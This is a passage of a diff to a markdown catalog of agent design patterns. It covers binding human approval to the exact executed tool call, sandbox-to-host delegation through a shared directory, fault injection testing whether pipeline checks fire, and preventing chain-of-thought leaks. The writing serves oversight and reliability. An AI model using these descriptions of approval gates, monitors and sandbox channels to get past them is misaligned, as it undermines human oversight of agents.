+Approval systems often ask a person or policy service to approve a proposed tool call, then execute it later. Between those steps, the request can be reconstructed, transformed, retried, delegated, or resumed from stored state. A seemingly valid approval may therefore be applied to a materially different action: another recipient, target, operation, payload, actor, acting surface, or policy version.
+
+Ordinary audit logs show what was approved and what was executed, but comparison after the fact does not prevent the mismatch. Tool-level allowlists and human approval gates decide whether an action may proceed; unless the acting boundary verifies the exact approved action, they do not close this approval-to-execution time-of-check/time-of-use gap.
+
+This is narrower than deciding where approval is required or which policy allows a tool call. It binds one authenticated approval to the authorization-relevant representation that a correctly mediated adapter will consume.
+
+## Solution
+
+Bind authorization to a deterministic identity of the **complete authorization-relevant representation presented for approval**, and require the acting adapter to rederive that identity immediately before execution.
+
+1. Define the authorization-relevant fields, such as task, approver, actor, acting surface, operation, resolved target identity, arguments, governing policy, expiry, and a nonce or single-use identifier.
+2. Canonicalize that representation with a documented profile. Compute a versioned, collision-resistant, domain-separated digest and bind the profile identifier into the authorization.
+3. Issue an authenticated, short-lived authorization envelope. A signature or MAC, protected opaque capability, or trusted transactional lookup must bind the issuer, digest, profile, expiry, nonce, policy, and intended enforcement surface.
+4. At the execution boundary, authenticate the envelope and reconstruct the action from the immutable values the adapter will actually consume. Canonicalize independently and compare the digest.
+5. Atomically compare-and-consume the single-use authorization before execution. Deny mismatches, expiry, replay, or integrity failure. Any material transformation after comparison requires a new authorization.
+6. Record authorization match, execution attempt, and independently observed external effect as separate claims. Digest equality correlates records; it does not prove that execution occurred or succeeded.
+
+```pseudo
+profile = "example.action-binding/v1+sha256"
+approved = canonicalize(profile, {
+  task_id, actor, acting_surface, operation,
+  target, arguments, policy_id, expires_at, nonce
+})
+authorization = authenticated_approve(
+  domain_digest(profile, approved), profile, expires_at, nonce
+)
+
+# Later, inside the adapter that will perform the action:
+verify_envelope_integrity_and_issuer(authorization)
+presented = canonicalize(profile, immutable_values_used_by_adapter())
+
+if domain_digest(profile, presented) != authorization.action_digest:
+    deny("approved action changed")
+
+atomic_compare_and_consume(authorization)  # fails on expiry, replay, or race
+result = execute(presented)
+record_attempt(authorization.id, result)
+# Resolve a stable external handle or read-back separately before claiming effect.
+```
+
+The adapter is the enforcement point. A prompt instruction to "execute only what was approved" is not this pattern because the same model can reinterpret both the approval and the action. If the adapter crashes after atomic consumption, reconcile through an idempotency key or authoritative status lookup; otherwise report the effect as unknown rather than replaying blindly.
+
+## Evidence
+
+- **Evidence Grade:** `mixed`
+- **Most Valuable Findings:**
+  - The NOA Action Digest defines an attempt-scoped correlation construction derived from an authorization record, parameter commitment, execution grant, and single-use nonce, while explicitly stating that it does not define execution binding and that equality proves neither execution nor effect.
+  - The SCITT AI-agent action-receipt profile separates an issuer-authenticated action record from prior authorization, controller-reported outcome, and external-world effect claims.
+  - Google AIP-151 supports stable operation handles for later status retrieval; Kubernetes API conventions separately distinguish desired specification from observed status.
+- **Unverified / Unclear:** The fail-closed adapter comparison is this pattern's synthesis, not a guarantee established by the cited specifications. Comparative production evidence is not yet established. Security depends on authenticated authorization, collision-resistant domain-separated canonicalization, atomic consumption, immutable post-check values, and complete mediation.
+
+## How to use it
+
+- Apply it to actions where post-approval drift would matter: payments, messages, deployments, permission changes, destructive operations, or externally visible commitments.
+- Include every field that could change the meaning or blast radius. Hashing only the tool name while leaving recipient or arguments outside the identity creates approval theater. Resolve aliases before approval when later resolution could change the resource.
+- Use a documented canonicalization profile. Reject duplicate keys, unsupported numeric forms, ambiguous paths, and unknown fields rather than normalizing them differently across services.
+- Keep authorization short-lived and preferably single-use. Authenticate it and bind it to the acting surface and policy version so it cannot be replayed through a broader adapter.
+- Make alternative execution paths pass through the same verification point. An unmediated CLI, browser, or fallback API can bypass an otherwise correct contract.
+- Test mutations and races deliberately: change one target, argument, actor, operation, policy, expiry, or nonce; then make two workers consume the same authorization. Prove rejection before duplicate execution.
+- After a matching attempt, verify the stated success criterion through an appropriately trusted status lookup, stable handle, or independent read-back. Report `unknown` when observation cannot resolve the outcome; do not reuse the authorization digest as success evidence.
+
+## Trade-offs
+
+- **Pros:** Detects and rejects committed-field drift on correctly mediated paths; makes approval scope machine-checkable; localizes enforcement at the acting boundary; improves correlation among approval, attempt, and observation records.
+- **Cons:** Requires authenticated envelopes, strict canonicalization, atomic consumption, crash reconciliation, and mediation of every acting path; changed requests incur another approval; aliases and unchecked post-comparison transformations can still defeat naive implementations.
+- **Limits:** A digest is an integrity identity, not authentication, authorization, or execution proof. A compromised approver, adapter, canonicalizer, or signing key remains dangerous. The pattern does not establish that supplied facts were true, that the action was wise, or that the external effect occurred.
+
+## References
+
+- Toraman et al., [*The NOA Action Digest: a Domain-Separated Correlation Value for Human-Approved Agent Actions*](https://datatracker.ietf.org/doc/html/draft-toraman-noa-action-digest-01)
+- Toraman, [*A SCITT Profile for AI-Agent Action Receipts*](https://datatracker.ietf.org/doc/html/draft-noa-scitt-ai-agent-receipt-01)
+- [Google AIP-151: Long-running operations](https://google.aip.dev/151)
+- [Kubernetes API conventions: spec and status](https://github.com/kubernetes/community/blob/master/contributors/devel/sig-architecture/api-conventions.md#spec-and-status)
 
 ---
 
@@ -8396,6 +9125,177 @@ workspace/
 
 - Primary source: https://www.anthropic.com/engineering/code-execution-with-mcp
 - LangChain FileStore: https://github.com/langchain-ai/langchain
+
+---
+
+## Filesystem-Mediated Host Delegation
+
+**Status:** emerging
+**Category:** Tool Use & Environment
+**Authors:** Abhinay Krupa (@abhinaykrupa)
+**Source:** https://github.com/abhinaykrupa/cowork-to-code-bridge
+
+## Problem
+
+An agent that runs inside a sandbox — a container, a hosted runtime, a cloud
+workspace — is deliberately cut off from the developer's real machine. That
+isolation is correct for safety, but it puts the most valuable work out of
+reach: the toolchain, the local filesystem, git credentials, the Docker daemon,
+and the half-configured services that only exist on someone's laptop.
+
+The obvious fixes are worse than the problem:
+
+- **Open a port on the host.** Now the developer's machine exposes another
+  network service that must be authenticated, authorized, and reachable through
+  NAT or a corporate VPN.
+- **Hold a synchronous connection.** Sandboxes get suspended, hit request
+  timeouts, and are reaped. A 20-minute build outlives the caller, and when the
+  caller dies mid-flight the work is orphaned with no way to reclaim the result.
+- **Re-issue the call on reconnect.** Without a durable identity for the
+  request, a retry after a dropped connection re-runs a deploy or a migration
+  a second time.
+
+The underlying difficulty is that the two sides have *different lifetimes*. The
+sandbox is ephemeral and may vanish mid-task; the host is long-lived. Any
+mechanism that assumes both endpoints stay alive for the duration of the work
+will drop tasks.
+
+## Solution
+
+Move the coupling from a connection to a **shared directory**. Both sides append
+to and read from a spool directory that is visible to each — a bind mount, a
+synced folder, or a mounted volume. The directory is still an inbound
+command-and-control channel, so it must be secured as deliberately as a network
+API even though the host exposes no listening socket.
+
+The directory holds three roles:
+
+- `queue/` — request files the sandbox writes
+- `results/` — completed result files the host writes
+- `inbox/` — messages travelling host → sandbox
+
+A host-side daemon watches `queue/`, executes what it finds against a whitelist
+of permitted operations, and writes the outcome to `results/` keyed by a task
+id. The sandbox writes a request, gets the id back immediately, and polls for
+that id whenever it happens to be alive.
+
+```pseudo
+// sandbox side — never blocks on the host
+key = stable_idempotency_key(op, args, caller_intent)
+atomic_write(queue/key, signed_request(op, typed_args, timeout, key))
+...                                  // sandbox may be suspended here
+result = read(results/key)           // returns pending | running | done | uncertain
+
+// host side — atomic rename lets only one worker claim a request
+for request in claim_by_rename(queue/, running/):
+    verify_signature_schema_and_permissions(request)
+    key = request.idempotency_key
+    if exists(results/key):
+        continue                              // replay the durable result
+    ledger.record(key, "running")
+    result = execute_allowlisted_operation(request, idempotency_key=key)
+    atomic_write(results/key, result)
+    ledger.record(key, "done")
+
+// after a crash, never blindly repeat an operation with uncertain outcome
+for key in ledger.entries("running"):
+    if downstream_can_lookup_or_deduplicate(key):
+        reconcile_and_publish(key)
+    else:
+        ledger.record(key, "uncertain")       // require human reconciliation
+```
+
+```mermaid
+graph LR
+    A[Sandboxed agent] -->|writes request| Q[queue/]
+    Q --> D[Host daemon]
+    D -->|executes on real machine| H[Toolchain / git / Docker]
+    D -->|writes outcome| R[results/]
+    R -->|polled when alive| A
+```
+
+Three properties do the real work:
+
+1. **No network listener.** The host opens no port. Reachability comes from the
+   shared mount, so NAT and VPN traversal are not part of this protocol. Access
+   to the directory still grants authority to submit work.
+2. **Durable decoupling.** On persistent storage, an atomically written and
+   flushed request can outlive the sandbox or poller. Surviving a host reboot
+   additionally requires a durable spool and ledger; a temporary bind mount or
+   best-effort sync does not provide that guarantee.
+3. **Idempotency plus reconciliation makes retries safe.** Completed requests
+   replay their stored result. Requests whose outcome was uncertain at a crash
+   are reconciled through a downstream idempotency key or status lookup. The
+   filesystem alone cannot provide exactly-once execution for external effects.
+
+Polling must be a pure read with no side effects, so a nervous caller can check
+as often as it likes.
+
+## Evidence
+
+- **Evidence Grade:** `medium`
+- **Most Valuable Findings:**
+  - Spool directories are a long-proven durability mechanism (Maildir, mail
+    queues, CI artifact dirs); applying them to agent RPC inherits crash-safety
+    without inventing a protocol.
+  - Decoupling caller lifetime from work lifetime is what makes long host-side
+    tasks survivable — the same reason job queues beat synchronous RPC generally.
+- **Unverified / Unclear:** No published comparative benchmark of this approach
+  against tunnel- or socket-based host bridges. Polling latency versus a
+  filesystem-watch trigger is implementation-specific and unmeasured here.
+
+## How to use it
+
+Reach for this when **the agent and the work live in different trust or
+lifetime domains** and the work must happen on specific hardware:
+
+- Cloud or sandboxed agents that need to build, test, or run something locally
+- Agents whose runtime imposes a short request timeout but whose tasks do not
+- Any case where opening an inbound port on a developer machine is unacceptable
+
+Prerequisites: a persistent directory both sides can reach, atomic file writes
+(write to a temporary name, flush, then rename), a durable idempotency ledger,
+and a whitelist on the host defining fixed operations and typed arguments.
+
+Authenticate each request with a signature or MAC. Enforce restrictive
+ownership and permissions, reject symlinks and path traversal, run the daemon
+with least privilege, and audit claims, execution, and results. For operations
+that cannot accept an idempotency key or report prior status, surface an
+`uncertain` result for human reconciliation instead of retrying automatically.
+
+Because the host executes real commands, pair the transport with a per-task
+safety envelope — a spend ceiling, a permission scope (read-only versus
+mutating), and optional human plan-approval before anything runs. The transport
+gives durability; it gives no safety on its own.
+
+## Trade-offs
+
+- **Pros:**
+  - On a persistent spool, survives sandbox suspension and caller death; with a
+    durable ledger and recovery, it can also survive host restarts
+  - No inbound port, no tunnel, no NAT traversal
+  - Trivially debuggable and auditable — the protocol is files you can read
+  - Completed work is safely replayed, while uncertain work is reconciled
+- **Cons:**
+  - Polling adds latency; unsuitable for tight interactive loops
+  - Requires a shared mount, which not every sandbox offers
+  - The daemon holds real execution authority, so the whitelist and permission
+    scope become the security boundary
+  - A shared directory is an inbound control surface and requires request
+    authentication, restrictive permissions, and path-safety checks
+  - Concurrent writers need atomic rename discipline or results interleave
+  - Exactly-once external effects require downstream deduplication or
+    reconciliation; the filesystem cannot guarantee them by itself
+  - Spool directories grow and need reaping
+
+## References
+
+- [Maildir](https://cr.yp.to/proto/maildir.html) — the canonical crash-safe
+  spool-directory design this borrows from.
+- [LangGraph — Human-in-the-Loop](https://langchain-ai.github.io/langgraph/concepts/human_in_the_loop/)
+  — pausing and resuming long-running work across process lifetimes.
+- [cowork-to-code-bridge](https://github.com/abhinaykrupa/cowork-to-code-bridge)
+  — a working implementation, maintained by this pattern's author.
 
 ---
 
@@ -12652,6 +13552,143 @@ In multi-agent systems, run verification at each hand-off between agents so erro
 
 ---
 
+## Own-Check Fault Injection
+
+**Status:** emerging
+**Category:** Reliability & Eval
+**Authors:** Jeff Otterson (@Jott2121)
+**Source:** https://github.com/Jott2121/sabot
+
+## Problem
+
+Multi-agent pipelines increasingly gate real work behind their own quality machinery:
+reviewer agents, deterministic guardrail callbacks, escalation interrupts, orchestrator
+progress ledgers. That machinery underwrites a widespread operational assumption — *if
+something goes wrong mid-pipeline, some check will catch it.*
+
+The assumption is rarely tested, because the usual evidence for it is the wrong
+measurement. End-to-end pass rate tells you the pipeline produced a good answer. It does
+not tell you whether anything would have noticed a bad input. Those come apart badly: a
+pipeline can absorb a corrupted tool result, silently route around it, and still emit a
+correct answer. Every dashboard stays green, and you have learned nothing about the case
+your pipeline *cannot* absorb.
+
+Worse, capability benchmarks and external monitors both miss the question. A benchmark
+asks whether the agent is smart. An external monitor asks whether *you* can detect a
+problem from outside. Neither asks whether the self-verification you already paid for
+actually fires.
+
+## Solution
+
+Inject one controlled fault per run into a live execution, tell the pipeline nothing, and
+score only what the pipeline's **own** components did about it. No external monitor may sit
+in the detection path — if your harness is what noticed, the pipeline did not.
+
+Three design commitments make the result trustworthy:
+
+**1. Separate the funnel.** Score each injected fault on independent axes and never blend
+them:
+
+- **detected** — a component of the pipeline emitted a *detection act* (a reviewer reject,
+  a guardrail block, an escalation, a retry carrying a reason)
+- **reacted** — some corrective action followed the detection
+- **recovered** — the end output still passed the same criterion as the no-fault baseline
+
+The interesting quantity is the cell where `recovered` is true and `detected` is false:
+**recovery without detection**. That is silent absorption, and it is invisible to any
+accuracy-only evaluation.
+
+**2. Adjudicate deterministically against a mapping published in advance.** Before
+collecting data, write down the exhaustive list of surfaces whose events count as a
+detection act, per framework, from that framework's documentation. Publishing the mapping
+first is the only real defense against the accusation that it was tuned to the answer.
+Keep any LLM judge in a clearly separate tier that cannot move the headline.
+
+**3. Validate the baseline, and exclude rather than adjust.** A faulted run is only
+scorable if the same cell passes with no fault injected. If the baseline fails, the cell
+is excluded and itemised — never scored as a miss. Likewise, if a fault cannot be verified
+as having landed, that is an exclusion, not a detection failure. Fake misses are the
+easiest way to manufacture an alarming number.
+
+Useful operator families, all of which occur naturally in production:
+
+| Operator | What it simulates |
+|---|---|
+| Tool-result corruption | An API returns a plausible but wrong value |
+| False success | A component reports work it did not do |
+| Message alteration | Inter-agent context drifts in transit |
+| Model downgrade | A silent fallback to a weaker tier |
+| Stale context | Superseded data reaches one agent |
+| Silent no-op | A side effect reported done, never performed |
+
+## How to use it
+
+1. **Pick one task with a mechanical pass criterion.** If a human has to judge success, you
+   cannot establish a baseline, and everything downstream is opinion.
+2. **Record the detection-act mapping for your stack before you run anything.** Which
+   events, in your framework, mean "a check fired"? Write them down. If a documented
+   surface turns out not to exist, strike it publicly rather than quietly.
+3. **Baseline first.** Run the task clean, several seeds, and keep only cells that pass.
+4. **Inject one fault per run** at a defined seam, and verify it landed.
+5. **Score the three axes separately** and publish the recovery-without-detection rate. It
+   is usually the number that changes minds.
+6. **If detection is low, test whether it is a protocol gap before assuming a capability
+   gap.** A cheap probe: require each reviewer to report every inconsistency it noticed,
+   quoting the exact conflicting values, *before* it emits a verdict. If detection rises
+   sharply, the model was already noticing and your protocol simply gave noticing nowhere
+   to go.
+7. **Watch what that fix does and does not buy.** Reporting is not reacting. A reviewer can
+   name the contradiction and approve anyway; measured, corrective acts often do not rise
+   with reports at all. Treat "the pipeline now tells you" as a genuine but partial win.
+
+For orchestrator-style pipelines that rewrite worker instructions, a protocol requirement
+survives only if it is part of the **output format contract**. Side instructions get
+rewritten away; format requirements do not.
+
+## Trade-offs
+
+- **Cost and blast radius.** Every cell is a real model run against a real pipeline. Budget
+  a circuit breaker, and never inject into a pipeline with live side effects.
+- **The instrument perturbs the system.** Changing an output contract to carry a report can
+  change orchestration behaviour — measured in one case as clean-run stall rates rising
+  from 3/25 to 18/25 seeds. Always re-run the no-fault baseline under the changed protocol
+  and publish the comparison, or you will attribute your own perturbation to the fix.
+- **Text-matching adjudication has a false-positive floor.** If you score a report by
+  looking for expected substrings, measure how often those substrings appear on *clean*
+  runs. Tasks that embed natural discrepancies produce a non-trivial base rate, and a
+  detection number without its base rate is not interpretable.
+- **Some operators have no signal on some surfaces.** A silent model downgrade injects no
+  text to quote, so a text-report surface cannot see it at all. Report that as no signal
+  rather than as a low score.
+- **Pipeline shape confounds cross-framework comparison.** If a fault lands after a given
+  architecture's last check has run, that cell is a structural zero, not a detection
+  failure. Compare only on the operator subset where every configuration can structurally
+  detect.
+- **Results are version-bound and model-bound.** Detection rates plausibly move with the
+  underlying model. Pin versions, state them, and resist generalising past them.
+
+## Evidence
+
+Applied across three production frameworks (LangGraph, CrewAI, AutoGen/Magentic-One) over
+900 injected faults, median own-check detection was **16.7%**, and recovery without
+detection was the single most common outcome in **every** configuration at 51–61% of valid
+faults. Best-documented guardrail configurations did not materially outperform defaults.
+Adding the anomaly-first reporting requirement to the same 825 paired cells raised the
+median to **55.0%**, while corrective acts stayed flat — on the original detection surface,
+recovery without detection remained near 50%. The pattern's central claim is that
+distinction: silent absorption became *legible*, not corrected.
+
+## References
+
+* [MAS-FIRE: Fault Injection and Reliability Evaluation for LLM-Based Multi-Agent Systems](https://arxiv.org/abs/2602.19843) — Jia et al. Establishes own-mechanism fault detection rates on academic multi-agent systems.
+* [AgentAssay](https://arxiv.org/abs/2603.02601) — Bhardwaj. Formalises an agent mutation score with model-swap and version-downgrade operators under external adjudication.
+* [On the Resilience of LLM-Based Multi-Agent Collaboration with Faulty Agents](https://arxiv.org/abs/2408.00989) — AutoInject. Injects mistakes into agent messages; reports end-task recovery, which is precisely the quantity this pattern keeps separate from detection.
+* [Failing Tools: Benchmarking LLM Agent Recovery Under Runtime Tool Failures](https://openreview.net/forum?id=j7YsSnA64D) — single-agent detection and recovery under tool failure.
+* [Assessing and Enhancing the Robustness of LLM-based Multi-Agent Systems Through Chaos Engineering](https://arxiv.org/abs/2505.03096) — Owotogbe. Chaos-engineering framing for agent systems.
+* Known implementation: [Sabot](https://github.com/Jott2121/sabot) — an open specification and Apache-2.0 harness applying this pattern to three production frameworks, with the detection-act mappings, seeds and anchors registered before any scored run and the full raw trace corpus published for offline recomputation. Authored by this pattern's contributor; listed as a worked example of the mapping-first and funnel-separation mechanics described above.
+
+---
+
 ## Parallel Tool Call Learning
 
 **Status:** emerging
@@ -13113,6 +14150,101 @@ flowchart TD
 **Academic Foundations:**
 - Yao, S. et al. (2022). "ReAct: Synergizing Reasoning and Acting in Language Models." ICLR 2023. https://arxiv.org/abs/2210.03629
 - Yan, S. et al. (2023). "API-Bank: A Comprehensive Benchmark for Tool-Augmented LLMs." https://arxiv.org/abs/2304.08244
+
+---
+
+## Persistent Test Memory Feedback Loop
+
+**Status:** emerging
+**Category:** Learning & Adaptation
+**Authors:** Pranshu Chittora (@pranshuchittora)
+**Source:** https://github.com/vostride/agent-qa
+
+## Problem
+
+An agent that executes end-to-end tests without durable memory starts each run from
+scratch. It repeatedly rediscovers navigation paths, semantic landmarks, and known
+failure causes. When an interface changes, brittle replay can fail even though the
+user intent is unchanged.
+
+Saving every trace is not enough. Raw traces contain transient state, sensitive
+values, and accidental successes. Replaying them uncritically turns old evidence
+into a new source of test flakiness.
+
+## Solution
+
+Place a scoped, evidence-gated memory loop around the test executor:
+
+1. **Scope retrieval** by application, environment, test intent, and identity
+   boundary. Retrieve a small set of relevant, recently verified records.
+2. **Intent-preserving execution** uses remembered semantic landmarks and prior
+   failure classifications as hints, not as a fixed action script.
+3. **Structured observation** records actions, assertions, screenshots or logs,
+   failure signatures, and the final oracle result.
+4. **Write gating** promotes a lesson only when evidence supports it. Redact
+   secrets and reject run-specific values such as session IDs or timestamps.
+5. **Correction and decay** lower confidence, supersede, or retire a record when a
+   later run contradicts it.
+
+A memory record should carry provenance rather than only a prose hint:
+
+    scope: app + environment + test-intent
+    claim: Checkout opens from the cart summary
+    confidence: 0.82
+    evidence: run-id-184
+    last_verified: 2026-08-16
+    failure_signature: null
+    supersedes: memory-id-27
+
+The key distinction from general log synthesis is that retrieval sits directly in
+the execution path, while every write is tied to a test oracle and can be reversed
+by contradictory evidence.
+
+## How to use it
+
+- Start with one repeated, non-destructive user flow and define its scope key.
+- Store artifacts separately from compact memories; keep links from each memory to
+  the evidence that justified it.
+- Prefer semantic facts such as labels, roles, and navigation relationships over
+  copied DOM paths or screen coordinates.
+- Require more than one confirmation before promoting risky or broadly scoped
+  lessons. Apply shorter expiry to volatile interfaces.
+- Treat a remembered path as a ranked hint. The executor must still observe the
+  current interface and satisfy the current assertion.
+- Make correction first-class: a failed remembered step should produce a proposed
+  replacement or confidence reduction, not an endless retry.
+- Redact credentials, personal data, tokens, and test fixtures before persistence.
+  Separate memory by tenant and environment.
+- Keep human approval around production writes, purchases, deletion, and other
+  high-impact actions even when a path has succeeded before.
+
+Use the loop for regression suites where the same intent is exercised many times
+against a changing application. Pair it with mocked workflow evals when the agent
+itself must be tested without touching a live system.
+
+## Trade-offs
+
+**Pros:**
+
+- Reduces repeated exploration across runs.
+- Lets tests survive some interface changes without discarding the original intent.
+- Preserves evidence and provenance for debugging.
+- Converts recurring failures into reusable, scoped knowledge.
+
+**Cons:**
+
+- Stale or falsely promoted memories can systematically mislead later runs.
+- Safe isolation, redaction, retention, and invalidation add operational complexity.
+- Retrieval and write gating increase latency and storage cost.
+- Adaptation can hide product regressions unless the assertion oracle remains
+  independent from the learned navigation path.
+
+## References
+
+- [Reflexion: Language Agents with Verbal Reinforcement Learning](https://arxiv.org/abs/2303.11366) — episodic feedback and memory for later decisions.
+- [Memory Synthesis from Execution Logs](memory-synthesis-from-execution-logs.md) — related batch synthesis of reusable lessons.
+- [Workflow Evals with Mocked Tools](workflow-evals-with-mocked-tools.md) — related safe validation of complete agent workflows.
+- [Vostride Agent QA](https://github.com/vostride/agent-qa) — contributor-affiliated implementation of persistent memory in a software-testing agent.
 
 ---
 
@@ -14641,6 +15773,78 @@ function handleConfigChange(
 
 ---
 
+## Reasoning-Token Firewall
+
+**Status:** validated-in-production
+**Category:** Reliability & Eval
+**Authors:** aaronjmars (@aaronjmars)
+**Source:** https://github.com/aeonfun/aeon/tree/main/harness-adapter
+
+## Problem
+
+Reasoning models emit two kinds of tokens in one response: private chain-of-thought and the final answer. When a harness builds its "result" from the whole stream and then tries to remove the reasoning afterward with string heuristics, it eventually leaks. Reasoning has no stable delimiter, the shape differs per model and per version, and a single missed case commits raw chain-of-thought into a file, a memory store, a notification, or the context of the next agent in the chain.
+
+That leak is not just cosmetic. Chain-of-thought routinely contains half-formed conclusions, discarded plans, and sensitive scratch data. Once it lands in a durable artifact it is indistinguishable from the intended answer, it inflates memory and context, and it can surface content the model never meant to publish.
+
+## Solution
+
+Treat the response as **typed events and select, do not strip**. The provider already labels which chunks are reasoning and which are the answer (`type: "thought"` vs `type: "text"`, `reasoning_content` vs `content`, thinking blocks vs text blocks). Assemble the result **only** by concatenating the answer-typed events. The reasoning-typed events are never read into the result path at all, so the firewall is structural at assembly time, not a post-hoc filter over mixed text.
+
+```pseudo
+result = ""
+for event in stream:
+    if event.type == ANSWER:      # e.g. "text" / content / text-block
+        result += event.data
+    # reasoning events ("thought" / reasoning_content) are never read here
+emit(result)
+```
+
+Design points:
+
+- The selection is a **whitelist of answer-typed events**, not a blacklist of reasoning markers. A blacklist fails open on the first unrecognized marker; a whitelist fails closed.
+- Enforce it at the **single choke point** where the artifact is assembled, so every downstream consumer (file write, memory, notification, next agent) inherits the guarantee for free.
+- **Normalize across harnesses.** Each labels its channels differently; map them all to one internal "answer vs reasoning" distinction inside the adapter so no skill or agent downstream can reintroduce the leak.
+
+```mermaid
+graph LR
+  S[Model stream] -->|type = answer| R[Result buffer]
+  S -.type = reasoning.-> X[Dropped: never read]
+  R --> A[Artifact: file / memory / notify / next agent]
+```
+
+## Evidence
+
+- **Evidence Grade:** medium
+- **Most valuable findings:**
+  - In a public multi-harness adapter (`aeonfun/aeon`), the xAI path builds `.result` only from `type=="text"` chunks and never reads `type=="thought"`; the Mistral-Vibe path takes the assistant `content` and never `reasoning_content`; the Codex path takes the final `agent_message`, not reasoning. One firewall, six harnesses.
+  - That project's run history leaked chain-of-thought precisely when the result was built from the whole stream. Switching to structural answer-only selection removed the leak as a class rather than case by case.
+- **Unverified / Unclear:** prevalence of this leak across other frameworks, and whether every provider guarantees a clean type label in every mode (streaming vs non-streaming, tool calls, refusals).
+
+## How to use it
+
+- Reach for it whenever a harness exposes reasoning as a distinct stream channel (OpenAI reasoning models, Anthropic extended-thinking blocks, DeepSeek `reasoning_content`, xAI thought chunks) **and** the answer is persisted or forwarded.
+- Prerequisites: a streaming or JSON mode that types its events, and one assembly function per harness.
+- Put the firewall in the adapter that normalizes each harness to your internal envelope. Downstream skills then cannot reintroduce the leak even by accident.
+- Add a regression test that feeds a stream containing reasoning chunks and asserts none of that text appears in the emitted result.
+
+## Trade-offs
+
+- **Pros:**
+  - Eliminates a whole class of chain-of-thought-leak bugs instead of patching leaks one at a time.
+  - Robust to model and version changes, because it relies on the provider's event type rather than fragile reasoning delimiters.
+  - Single point of enforcement; keeps memory and artifacts clean and smaller.
+- **Cons:**
+  - Depends on the provider labeling channels correctly; a mislabeled chunk defeats it.
+  - If you actually want the reasoning (debugging, transparency), you need a separate opt-in channel; see `verbose-reasoning-transparency`.
+  - Non-streamed or untyped responses cannot use structural selection and fall back to weaker heuristics.
+
+## References
+
+- Aeon harness-adapter, a six-harness implementation of the firewall: https://github.com/aeonfun/aeon/tree/main/harness-adapter
+- Related and complementary: `chain-of-thought-monitoring-interruption` (watches CoT for safety mid-run; different intent, same channel).
+
+---
+
 ## Recursive Best-of-N Delegation
 
 **Status:** emerging
@@ -14898,6 +16102,75 @@ WFGY implements a "semantic firewall" that validates semantic stability **before
 - [Semantic Clinic Index](https://github.com/onestardao/WFGY/blob/main/ProblemMap/SemanticClinicIndex.md)
 - [Grandma's Clinic (Beginner-Friendly)](https://github.com/onestardao/WFGY/blob/main/ProblemMap/GrandmaClinic/README.md)
 - "Agentic Retrieval-Augmented Generation: A Survey" (arXiv:2501.09136, 2025)
+
+---
+
+## Rendered UI Finish Gate
+
+**Status:** emerging
+**Category:** Feedback Loops
+**Authors:** Samuel Bushi (@samuelbushi)
+**Source:** https://github.com/uizze/uizze/tree/main/skills/anti-ui-slop
+
+## Problem
+
+Coding agents can produce frontend code that compiles and passes unit tests while still shipping generic, incomplete, or misleading interfaces. Common failures include missing loading and error states, controls that look interactive but do nothing, token drift, inaccessible focus behavior, and responsive layouts that were never rendered at their target widths. A source-only review cannot reliably detect all of these problems.
+
+## Solution
+
+Add a bounded finish gate after implementation and before merge. The gate compares the rendered interface with a small design contract and checks both behavior and visual evidence:
+
+1. **Contract check** -- identify the intended hierarchy, content model, tokens, responsive rules, and platform-specific constraints.
+2. **State check** -- enumerate and exercise loading, empty, error, disabled, focus, success, and permission states that the feature can reach.
+3. **Interaction check** -- verify that visible controls have real handlers, keyboard paths, labels, focus treatment, and correct navigation or submission behavior.
+4. **Render check** -- inspect the page at representative viewport sizes and compare the result with the contract, not with a generic template.
+5. **Finish verdict** -- report concrete findings with evidence, severity, and the smallest change needed to resolve each blocking issue.
+
+```pseudo
+contract = read_design_contract(change)
+states = enumerate_required_states(change)
+implementation = inspect_source(change)
+rendered = render_at_viewports(change, contract.viewports)
+
+findings = []
+findings += check_tokens_and_hierarchy(implementation, contract)
+findings += check_state_coverage(implementation, states)
+findings += check_interactions(rendered, contract)
+findings += check_responsive_rendered_output(rendered, contract)
+
+return verdict(findings, evidence=findings.evidence)
+```
+
+The gate is deliberately separate from product-specific visual taste. It blocks missing behavior and unsupported claims first, then records visual quality findings that a human can review.
+
+## Evidence
+
+- **Evidence Grade:** `medium`
+- **Most Valuable Findings:** Source checks catch inert controls and missing branches; rendered checks expose layout and state failures that source checks miss; a written contract makes review criteria repeatable.
+- **Unverified / Unclear:** The best viewport set, severity thresholds, and amount of human review vary by product and platform.
+
+## How to use it
+
+- Require the gate for pull requests that change user-facing web or native UI.
+- Ask the implementing agent to write or update the design contract before coding when hierarchy, states, or responsive behavior are unclear.
+- Keep the first pass deterministic: inspect changed files, enumerate reachable states, render representative paths, and attach findings to the change.
+- Treat missing states, inert controls, broken keyboard paths, and token violations as merge blockers. Treat subjective polish as a review item unless the contract makes it explicit.
+- Store the rendered evidence and verdict with the pull request when the project needs an audit trail.
+
+### Known implementations
+
+- [UIZZE anti-ui-slop Skill](https://github.com/uizze/uizze/tree/main/skills/anti-ui-slop) -- an implementation that applies contract, state, interaction, and rendered-output checks to coding-agent UI changes.
+
+## Trade-offs
+
+- **Pros:** Finds failures that compile-time checks and source-only review miss; makes UI review repeatable; keeps required states and interaction semantics visible; produces actionable evidence rather than a vague quality score.
+- **Cons:** Adds render and review time; requires representative test data and viewport choices; visual comparison can still encode reviewer bias; not every issue can be reduced to a deterministic rule.
+
+## References
+
+- [UIZZE anti-ui-slop Skill](https://github.com/uizze/uizze/tree/main/skills/anti-ui-slop) -- disclosed primary implementation.
+- [UIZZE public design contract](https://github.com/uizze/uizze/blob/main/DESIGN.md) -- example contract covering tokens, typography, states, responsive behavior, and finish criteria.
+- [Web Content Accessibility Guidelines (WCAG)](https://www.w3.org/WAI/standards-guidelines/wcag/) -- neutral reference for interaction and accessibility requirements.
 
 ---
 
@@ -19490,6 +20763,135 @@ flowchart TD
 - Parisien, et al. (2024). [Deliberation Before Action](https://arxiv.org/abs/2403.05441) — shows 40-70% success rate improvement with natural language planning before tool execution
 
 [Source](https://www.nibzard.com/claude-code)
+
+---
+
+## Tracker-as-Desired-State Reconciliation
+
+**Status:** emerging
+**Category:** Orchestration & Control
+**Authors:** Serghei Iakovlev (@sergeyklay)
+**Source:** https://github.com/kubernetes/design-proposals-archive/blob/main/architecture/principles.md
+
+## Problem
+
+An orchestrator that dispatches long-running agents needs to answer two questions continuously: *what work exists*, and *is it still wanted*. Two common answers both fail in production.
+
+**Edge-triggered dispatch.** A webhook or event fires and an agent starts. If the delivery is lost — receiver redeploy, outage, rate limit, a paused queue — the work silently never happens. Nothing is wrong anywhere; there is simply no record that anything should have occurred. Replaying the event stream is not a fix, because a second `issue.assigned` delivery starts a second agent.
+
